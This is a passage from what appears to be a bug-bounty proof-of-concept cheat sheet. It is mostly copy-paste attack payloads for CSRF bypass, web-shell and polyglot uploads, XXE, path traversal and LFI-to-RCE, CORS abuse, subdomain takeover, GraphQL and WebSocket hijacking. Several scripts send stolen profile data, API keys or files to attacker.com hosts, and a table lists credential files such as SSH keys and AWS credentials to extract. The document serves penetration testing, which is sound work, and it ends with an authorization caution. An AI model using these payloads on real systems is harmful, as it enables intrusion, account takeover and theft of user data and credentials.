  <input type="hidden" name="confirm_password" value="hacked123" />
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

::

### CSRF Token Bypass Techniques

```bash
# Remove CSRF token entirely
curl -s -X POST "https://target.com/api/settings" \
  -H "Cookie: session=VICTIM_SESSION" \
  -d "email=attacker@evil.com"

# Empty CSRF token
curl -s -X POST "https://target.com/api/settings" \
  -H "Cookie: session=VICTIM_SESSION" \
  -d "email=attacker@evil.com&csrf_token="

# Change request method (POST → GET)
curl -s "https://target.com/api/settings?email=attacker@evil.com&csrf_token=anything" \
  -H "Cookie: session=VICTIM_SESSION"

# Use another user's CSRF token (not tied to session)
curl -s -X POST "https://target.com/api/settings" \
  -H "Cookie: session=VICTIM_SESSION" \
  -d "email=attacker@evil.com&csrf_token=ATTACKER_CSRF_TOKEN"

# CSRF token in cookie vs body mismatch
curl -s -X POST "https://target.com/api/settings" \
  -H "Cookie: session=VICTIM_SESSION; csrf=attacker_value" \
  -d "email=attacker@evil.com&csrf_token=attacker_value"

# Referer header validation bypass
curl -s -X POST "https://target.com/api/settings" \
  -H "Referer: https://target.com.attacker.com/" \
  -H "Cookie: session=VICTIM_SESSION" \
  -d "email=attacker@evil.com"

# Remove Referer header
curl -s -X POST "https://target.com/api/settings" \
  -H "Referer:" \
  -H "Cookie: session=VICTIM_SESSION" \
  -d "email=attacker@evil.com"
```

---

## File Upload Exploitation PoC

::badge
High
::

### Malicious File Upload Techniques

::tabs
  ::tabs-item{icon="i-lucide-file-code" label="Web Shells"}

  ```bash
  # PHP web shell
  echo '<?php system($_GET["cmd"]); ?>' > shell.php

  # PHP shell with extension bypass
  cp shell.php shell.php.jpg
  cp shell.php shell.pHp
  cp shell.php shell.php5
  cp shell.php shell.phtml
  cp shell.php shell.php.png
  cp shell.php shell.php%00.png

  # Upload with Content-Type manipulation
  curl -X POST "https://target.com/upload" \
    -H "Authorization: Bearer TOKEN" \
    -F "file=@shell.php;type=image/jpeg;filename=shell.php"

  # Double extension
  curl -X POST "https://target.com/upload" \
    -F "file=@shell.php;filename=shell.php.jpg"

  # Null byte injection (older systems)
  curl -X POST "https://target.com/upload" \
    -F "file=@shell.php;filename=shell.php%00.jpg"

  # .htaccess upload (Apache)
  echo 'AddType application/x-httpd-php .jpg' > .htaccess
  curl -X POST "https://target.com/upload" -F "file=@.htaccess"
  curl -X POST "https://target.com/upload" -F "file=@shell.jpg"
  curl -s "https://target.com/uploads/shell.jpg?cmd=id"

  # web.config upload (IIS)
  cat << 'EOF' > web.config
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="web_config" path="*.config" verb="*"
          modules="IsapiModule"
          scriptProcessor="%windir%\system32\inetsrv\asp.dll"
          resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config" />
          </fileExtensions>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
  EOF
  ```
  ::

  ::tabs-item{icon="i-lucide-image" label="Image-Based Attacks"}

  ```bash
  # Polyglot JPEG/PHP
  # Create a valid JPEG that is also valid PHP
  python3 -c "
  import struct
  payload = b'\xff\xd8\xff\xe0' + struct.pack('>H', 16) + b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
  payload += b'\xff\xfe' + struct.pack('>H', 2 + len(b'<?php system(\$_GET[\"cmd\"]); ?>'))
  payload += b'<?php system(\$_GET[\"cmd\"]); ?>'
  payload += b'\xff\xd9'
  open('polyglot.php.jpg', 'wb').write(payload)
  "

  # SVG with embedded XSS
  cat << 'EOF' > xss.svg
  <?xml version="1.0" standalone="no"?>
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">
      alert(document.domain);
    </script>
  </svg>
  EOF
  curl -X POST "https://target.com/upload" -F "avatar=@xss.svg;type=image/svg+xml"

  # SVG with SSRF via external entity
  cat << 'EOF' > ssrf.svg
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text>&xxe;</text>
  </svg>
  EOF

  # GIF with embedded PHP
  printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php

  # EXIF metadata injection
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
  mv image.jpg image.php.jpg
  ```
  ::

  ::tabs-item{icon="i-lucide-archive" label="Archive-Based Attacks"}

  ```bash
  # Zip Slip - path traversal via archive
  python3 -c "
  import zipfile
  with zipfile.ZipFile('exploit.zip', 'w') as z:
      z.writestr('../../../var/www/html/shell.php', '<?php system(\$_GET[\"cmd\"]); ?>')
  "
  curl -X POST "https://target.com/upload" -F "file=@exploit.zip"

  # Tar path traversal
  tar cf exploit.tar --absolute-names /var/www/html/shell.php

  # Symlink attack via zip
  ln -s /etc/passwd link
  zip --symlinks exploit.zip link
  curl -X POST "https://target.com/upload" -F "file=@exploit.zip"

  # XXE via XLSX (Office Open XML)
  mkdir -p xl
  cat << 'EOF' > xl/workbook.xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <workbook>&xxe;</workbook>
  EOF
  cd xl && zip ../xxe.xlsx workbook.xml && cd ..
  curl -X POST "https://target.com/upload" -F "file=@xxe.xlsx"

  # XXE via DOCX
  mkdir -p word
  cat << 'EOF' > word/document.xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net/?data=xxe">
  ]>
  <document>&xxe;</document>
  EOF
  cd word && zip ../xxe.docx document.xml && cd ..
  ```
  ::
::

---

## XXE (XML External Entity) PoC Techniques

::badge
Critical
::

### XXE Payload Variations

::code-collapse

```bash
# Basic XXE - File Read
curl -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <root>&xxe;</root>'

# XXE via parameter entity (blind)
curl -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
    %xxe;
  ]>
  <root>test</root>'

# evil.dtd on attacker server:
# <!ENTITY % data SYSTEM "file:///etc/passwd">
# <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>">
# %param1;

# XXE via Content-Type change (JSON → XML)
# Original: Content-Type: application/json
# {"search": "test"}
# Changed to:
curl -X POST "https://target.com/api/search" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <search>&xxe;</search>'

# XXE in SOAP
curl -X POST "https://target.com/soap" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Body>
      <GetUser>&xxe;</GetUser>
    </soapenv:Body>
  </soapenv:Envelope>'

# SSRF via XXE
curl -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  ]>
  <root>&xxe;</root>'

# Billion Laughs DoS (use carefully - for report only)
curl -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
  <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ]>
  <root>&lol3;</root>'

# XXE via file upload (SVG)
cat << 'SVGEOF' > xxe.svg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
SVGEOF

# XXE error-based exfiltration
curl -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '"'"'file:///nonexistent/%file;'"'"'>">
    %eval;
    %error;
  ]>
  <root>test</root>'

# PHP filter wrapper for base64 exfiltration
curl -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  ]>
  <root>&xxe;</root>'
```

::

---

## Path Traversal & LFI PoC Techniques

::badge
High
::

### Traversal Payloads

```bash
# Basic path traversal
curl -s "https://target.com/file?path=../../../../etc/passwd"
curl -s "https://target.com/file?path=....//....//....//....//etc/passwd"

# URL encoded traversal
curl -s "https://target.com/file?path=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Double URL encoded
curl -s "https://target.com/file?path=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# Unicode/UTF-8 encoded
curl -s "https://target.com/file?path=..%c0%af..%c0%af..%c0%afetc/passwd"
curl -s "https://target.com/file?path=..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd"

# Null byte injection (PHP < 5.3.4)
curl -s "https://target.com/file?path=../../../../etc/passwd%00.jpg"

# Path truncation (older systems)
curl -s "https://target.com/file?path=../../../../etc/passwd.........."

# Backslash for Windows
curl -s "https://target.com/file?path=..\\..\\..\\..\\windows\\win.ini"

# Wrapper-based LFI (PHP)
curl -s "https://target.com/file?path=php://filter/convert.base64-encode/resource=index.php"
curl -s "https://target.com/file?path=php://input" -d "<?php system('id'); ?>"
curl -s "https://target.com/file?path=expect://id"
curl -s "https://target.com/file?path=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
```

### LFI to RCE Techniques

::accordion
  ::accordion-item
  ---
  icon: i-lucide-file-warning
  label: Log Poisoning
  ---

  ```bash
  # Step 1: Inject PHP code into access log via User-Agent
  curl -s "https://target.com/" \
    -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

  # Step 2: Include the log file via LFI
  curl -s "https://target.com/file?path=../../../../var/log/apache2/access.log&cmd=id"

  # Alternative log locations
  curl -s "https://target.com/file?path=../../../../var/log/nginx/access.log&cmd=id"
  curl -s "https://target.com/file?path=../../../../var/log/httpd/access_log&cmd=id"

  # SSH auth log poisoning
  ssh '<?php system($_GET["cmd"]); ?>'@target.com
  curl -s "https://target.com/file?path=../../../../var/log/auth.log&cmd=id"

  # Mail log poisoning
  swaks --to root@target.com --body '<?php system($_GET["cmd"]); ?>'
  curl -s "https://target.com/file?path=../../../../var/log/mail.log&cmd=id"
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-file-warning
  label: /proc/self/environ
  ---

  ```bash
  # Inject via User-Agent, include /proc/self/environ
  curl -s "https://target.com/file?path=../../../../proc/self/environ" \
    -H "User-Agent: <?php system('id'); ?>"

  # /proc/self/fd/ brute force
  for fd in $(seq 0 20); do
    response=$(curl -s "https://target.com/file?path=../../../../proc/self/fd/${fd}" | head -c 100)
    echo "fd/$fd: $response"
  done
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-file-warning
  label: PHP Session Files
  ---

  ```bash
  # Step 1: Set session data with PHP code
  curl -s "https://target.com/login" \
    -d "username=<?php system(\$_GET['cmd']); ?>&password=test" \
    -c cookies.txt

  # Step 2: Find session file and include via LFI
  SESSION_ID=$(grep PHPSESSID cookies.txt | awk '{print $7}')
  curl -s "https://target.com/file?path=../../../../tmp/sess_${SESSION_ID}&cmd=id"

  # Alternative session paths
  curl -s "https://target.com/file?path=../../../../var/lib/php/sessions/sess_${SESSION_ID}&cmd=id"
  curl -s "https://target.com/file?path=../../../../var/lib/php5/sess_${SESSION_ID}&cmd=id"
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-file-warning
  label: PHP Filter Chain RCE
  ---

  ```bash
  # PHP filter chain generator for arbitrary file content
  # This generates a chain of php://filter that creates arbitrary content
  python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'

  # Use the generated chain
  curl -s "https://target.com/file?path=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...(generated chain)...|convert.base64-decode/resource=php://temp&cmd=id"

  # Pearcmd LFI to RCE (if pecl/pear installed)
  curl -s "https://target.com/file?path=../../../../usr/local/lib/php/pearcmd.php&+config-create+/<?=system(\$_GET['cmd'])?>+/tmp/shell.php"
  curl -s "https://target.com/file?path=../../../../tmp/shell.php&cmd=id"
  ```
  ::
::

### High-Value Files to Extract

::collapsible

| Operating System | File Path |
| --- | --- |
| Linux | `/etc/passwd` |
| Linux | `/etc/shadow` |
| Linux | `/etc/hosts` |
| Linux | `/proc/self/environ` |
| Linux | `/proc/self/cmdline` |
| Linux | `/home/user/.ssh/id_rsa` |
| Linux | `/home/user/.bash_history` |
| Windows | `C:\Windows\win.ini` |
| Windows | `C:\Windows\System32\drivers\etc\hosts` |
| Windows | `C:\inetpub\wwwroot\web.config` |

| Application | File Path |
| --- | --- |
| Apache | `/etc/apache2/apache2.conf` |
| Nginx | `/etc/nginx/nginx.conf` |
| PHP | `/etc/php/7.x/fpm/php.ini` |
| MySQL | `/etc/mysql/my.cnf` |
| Django | `settings.py` |
| Node.js | `.env`, `package.json` |
| Docker | `/proc/1/cgroup` |
| Kubernetes | `/var/run/secrets/kubernetes.io/serviceaccount/token` |
| AWS | `~/.aws/credentials` |
| Git | `.git/config`, `.git/HEAD` |

::

---

## CORS Misconfiguration PoC

::badge
High
::

### CORS Testing Methods

```bash
# Test reflected origin
curl -s -I "https://target.com/api/user" \
  -H "Origin: https://evil.com" | grep -i "access-control"

# Test null origin
curl -s -I "https://target.com/api/user" \
  -H "Origin: null" | grep -i "access-control"

# Test subdomain wildcard
curl -s -I "https://target.com/api/user" \
  -H "Origin: https://evil.target.com" | grep -i "access-control"

# Test prefix matching bypass
curl -s -I "https://target.com/api/user" \
  -H "Origin: https://target.com.evil.com" | grep -i "access-control"

# Test suffix matching bypass
curl -s -I "https://target.com/api/user" \
  -H "Origin: https://eviltarget.com" | grep -i "access-control"

# Test with credentials
curl -s -I "https://target.com/api/user" \
  -H "Origin: https://evil.com" | grep -iE "access-control-allow-(origin|credentials)"

# Automated CORS testing across endpoints
cat endpoints.txt | while read url; do
  origin_header=$(curl -s -I "$url" -H "Origin: https://evil.com" | grep -i "access-control-allow-origin")
  if echo "$origin_header" | grep -qi "evil.com"; then
    echo "[VULN] $url - Reflects arbitrary origin"
  fi
done
```

### CORS Exploitation PoC

::code-group

```html [Data Exfiltration]
<script>
var req = new XMLHttpRequest();
req.onload = function() {
  // Send stolen data to attacker
  var exfil = new XMLHttpRequest();
  exfil.open('POST', 'https://attacker.com/log');
  exfil.send(this.responseText);
};
req.open('GET', 'https://target.com/api/user/profile', true);
req.withCredentials = true;
req.send();
</script>
```

```html [Account Takeover]
<script>
// Step 1: Read CSRF token from profile page
fetch('https://target.com/api/user/settings', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    // Step 2: Change email using stolen CSRF token
    fetch('https://target.com/api/user/email', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        email: 'attacker@evil.com',
        csrf: data.csrf_token
      })
    });
  });
</script>
```

```html [API Key Theft]
<script>
fetch('https://target.com/api/user/api-keys', {
  credentials: 'include'
})
.then(r => r.json())
.then(keys => {
  navigator.sendBeacon('https://attacker.com/collect', JSON.stringify(keys));
});
</script>
```

::

---

## Subdomain Takeover PoC

::badge
High
::

### Detection and Exploitation

```bash
# Find dangling CNAME records
subfinder -d target.com -silent | dnsx -cname -resp -silent | while read line; do
  domain=$(echo $line | awk '{print $1}')
  cname=$(echo $line | awk '{print $2}')
  
  # Check if CNAME target is available
  http_code=$(curl -s -o /dev/null -w "%{http_code}" "http://${domain}" --max-time 5)
  
  if [[ "$http_code" == "404" ]] || [[ "$http_code" == "000" ]]; then
    echo "[POTENTIAL TAKEOVER] $domain -> $cname (HTTP: $http_code)"
  fi
done

# Check specific services for takeover indicators
FINGERPRINTS=(
  "There isn't a GitHub Pages site here"
  "NoSuchBucket"
  "No Such Account"
  "You're Almost There"
  "There's nothing here, yet."
  "is not a registered IngressPoint"
  "Fastly error: unknown domain"
  "The request could not be satisfied"
  "Sorry, this shop is currently unavailable"
  "Do you want to register"
  "Help Center Closed"
  "Oops - We didn't find your site"
  "No settings were found for this company"
  "is already a registered domain"
)

check_takeover() {
  local domain=$1
  local body=$(curl -s "http://${domain}" --max-time 10)
  
  for fingerprint in "${FINGERPRINTS[@]}"; do
    if echo "$body" | grep -qi "$fingerprint"; then
      echo "[TAKEOVER] $domain - Fingerprint: $fingerprint"
      return 0
    fi
  done
}

# Batch check
subfinder -d target.com -silent | while read sub; do
  check_takeover "$sub"
done

# Using nuclei for automated detection
subfinder -d target.com -silent | nuclei -t takeovers/ -silent

# Using subjack
subjack -w subdomains.txt -t 100 -timeout 30 -ssl -c fingerprints.json -v

# AWS S3 bucket takeover
# Step 1: Confirm bucket doesn't exist
aws s3 ls s3://target-assets 2>&1 | grep "NoSuchBucket"

# Step 2: Create bucket with same name
aws s3 mb s3://target-assets --region us-east-1

# Step 3: Upload PoC
echo "<h1>Subdomain Takeover PoC by researcher</h1>" > index.html
aws s3 cp index.html s3://target-assets/ --acl public-read
aws s3 website s3://target-assets/ --index-document index.html
```

---

## GraphQL Exploitation PoC

::badge
High
::

### GraphQL Reconnaissance and Exploitation

::tabs
  ::tabs-item{icon="i-lucide-search" label="Introspection"}

  ```bash
  # Full introspection query
  curl -s -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

  # Simplified introspection
  curl -s -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { queryType { fields { name description args { name type { name } } } } } }"}'

  # List all mutations
  curl -s -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { mutationType { fields { name args { name type { name kind } } } } } }"}'

  # Introspection disabled bypass - field suggestion abuse
  curl -s -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __typ }"}' | grep -i "did you mean"

  # Using clairvoyance for schema recovery when introspection is disabled
  python3 clairvoyance.py -u "https://target.com/graphql" -w wordlist.txt
  ```
  ::

  ::tabs-item{icon="i-lucide-bug" label="Exploitation"}

  ```bash
  # IDOR via GraphQL
  curl -s -X POST "https://target.com/graphql" \
    -H "Authorization: Bearer ATTACKER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ user(id: 1) { id email phone ssn address } }"}'

  # Batch query for mass data extraction
  curl -s -X POST "https://target.com/graphql" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ user1: user(id: 1) { email } user2: user(id: 2) { email } user3: user(id: 3) { email } }"}'

  # SQL injection via GraphQL
  curl -s -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ user(name: \"admin\\\" OR 1=1--\") { id email } }"}'

  # Authorization bypass - access admin mutations
  curl -s -X POST "https://target.com/graphql" \
    -H "Authorization: Bearer USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"mutation { deleteUser(id: 1) { success } }"}'

  # Nested query DoS (depth attack)
  curl -s -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ users { posts { comments { author { posts { comments { author { id } } } } } } } }"}'

  # Batch attack for brute force
  QUERY=""
  for i in $(seq 0 99); do
    QUERY="${QUERY} q${i}: login(username: \"admin\", password: \"password${i}\") { token }"
  done
  curl -s -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"mutation { ${QUERY} }\"}"
  ```
  ::
::

---

## WebSocket Exploitation PoC

::badge
Medium
::

```bash
# WebSocket connection test
websocat ws://target.com/ws

# Cross-Site WebSocket Hijacking (CSWSH)
cat << 'EOF' > cswsh.html
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  ws.send(JSON.stringify({action: 'get_profile'}));
};
ws.onmessage = function(event) {
  // Exfiltrate data
  fetch('https://attacker.com/exfil', {
    method: 'POST',
    body: event.data
  });
};
</script>
EOF

# WebSocket message injection
python3 -c "
import websocket
import json

ws = websocket.create_connection('wss://target.com/ws',
    cookie='session=STOLEN_SESSION')

# Send malicious message
ws.send(json.dumps({
    'action': 'send_message',
    'to': 'admin',
    'content': '<script>alert(document.domain)</script>'
}))

result = ws.recv()
print(result)
ws.close()
"

# WebSocket SQL injection
python3 -c "
import websocket
import json

ws = websocket.create_connection('wss://target.com/ws')
ws.send(json.dumps({
    'action': 'search',
    'query': \"' UNION SELECT username,password FROM users-- \"
}))
print(ws.recv())
ws.close()
"
```

---

## Automated PoC Generation Workflow

::steps{level="4"}

#### Reconnaissance & Target Mapping

```bash
# Comprehensive subdomain enumeration
subfinder -d target.com -all -silent | \
  dnsx -silent -a -resp | \
  sort -u > live_subdomains.txt

# URL discovery and parameter extraction
cat live_subdomains.txt | httpx -silent | \
  katana -d 5 -silent -jc | \
  sort -u > all_urls.txt

# Extract URLs with parameters
cat all_urls.txt | grep "=" | uro | sort -u > parameterized_urls.txt

# Technology fingerprinting
httpx -l live_subdomains.txt -tech-detect -status-code -title -silent -json > tech_stack.json
```

#### Vulnerability Scanning

```bash
# XSS scanning
cat parameterized_urls.txt | dalfox pipe --blind https://YOUR_XSS_HUNTER -o xss_results.txt

# SQLi scanning
cat parameterized_urls.txt | while read url; do
  sqlmap -u "$url" --batch --random-agent --level 3 --risk 2 --output-dir=sqlmap_results/
done

# SSRF testing
cat parameterized_urls.txt | qsreplace "http://YOUR_BURP_COLLABORATOR" | \
  httpx -silent -mc 200,301,302

# Nuclei comprehensive scan
nuclei -l live_subdomains.txt -t cves/ -t vulnerabilities/ -t exposures/ \
  -t misconfiguration/ -severity critical,high -silent -o nuclei_results.txt

# CORS misconfiguration scan
cat live_subdomains.txt | while read domain; do
  cors=$(curl -s -I "https://${domain}" -H "Origin: https://evil.com" | \
    grep -i "access-control-allow-origin: https://evil.com")
  if [ -n "$cors" ]; then
    echo "[CORS VULN] $domain"
  fi
done
```

#### PoC Validation & Impact Maximization

```bash
# Validate XSS findings with impact demonstration
while read finding; do
  url=$(echo "$finding" | grep -oP 'https?://[^\s]+')
  echo "[*] Testing impact escalation for: $url"
  
  # Test cookie access
  curl -s "$url" | grep -i "httponly" || echo "  [!] Cookies accessible - session hijack possible"
  
  # Test same-origin API access
  echo "  [*] Check if sensitive APIs are accessible from XSS context"
done < xss_results.txt

# Validate SQLi with controlled extraction
while read finding; do
  url=$(echo "$finding" | grep -oP 'https?://[^\s]+')
  sqlmap -u "$url" --batch --random-agent --current-db --current-user --is-dba
done < sqli_results.txt
```

#### Report Generation

```bash
# Generate structured report
cat << 'REPORT' > poc_report.md
# Bug Bounty Report

## Vulnerability: [TYPE]
## Severity: [CRITICAL/HIGH/MEDIUM]
## CVSS Score: [X.X]

### Affected Endpoint
[URL]

### Description
[Detailed description of the vulnerability]

### Steps to Reproduce
1. Navigate to [URL]
2. Inject payload: [PAYLOAD]
3. Observe [BEHAVIOR]

### Proof of Concept
[Working exploit code]

### Impact
[What an attacker can achieve]

### Remediation
[Suggested fix]
REPORT

echo "[*] Report template generated: poc_report.md"
```

::

---

## PoC Development Best Practices

::card-group
  ::card
  ---
  title: Minimal Footprint
  icon: i-lucide-minimize-2
  ---
  Use the **least destructive** payload possible. Use `alert(document.domain)` instead of `alert(1)` for XSS. Read `/etc/hostname` instead of `/etc/shadow` for file read.
  ::

  ::card
  ---
  title: Reproducibility
  icon: i-lucide-repeat
  ---
  Every PoC must be **100% reproducible**. Include exact URLs, headers, cookies, and payloads. Use `curl` commands that can be copy-pasted.
  ::

  ::card
  ---
  title: Impact Focus
  icon: i-lucide-trending-up
  ---
  Always demonstrate the **maximum realistic impact**. XSS → Account Takeover. SSRF → Cloud Credential Theft. SQLi → Data Breach.
  ::

  ::card
  ---
  title: Legal Boundaries
  icon: i-lucide-scale
  ---
  Never access data beyond what's needed for proof. Don't exfiltrate real user data. Stay within the **program's scope and rules**.
  ::
::

::caution
Always ensure your testing is authorized. Only test against programs with explicit bug bounty policies or with written permission. Unauthorized testing is illegal regardless of intent.
::